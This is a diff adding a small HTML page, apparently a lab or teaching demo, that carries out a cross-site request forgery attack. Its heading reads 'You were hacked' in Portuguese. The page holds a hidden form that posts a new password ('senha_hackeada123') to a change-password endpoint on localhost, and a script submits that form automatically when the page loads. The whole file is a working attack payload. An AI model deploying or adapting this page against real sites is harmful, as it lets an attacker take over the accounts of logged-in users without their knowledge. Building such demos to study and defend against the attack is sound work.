@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Attack</title>
+  </head>
+  <body>
+    <h1>Você foi hackeado 😈</h1>
+
+    <form action="http://localhost:3000/change-password" method="POST" style="display: none;">
+      <input type="hidden" name="newPassword" value="senha_hackeada123" />
+      <input type="submit" />
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
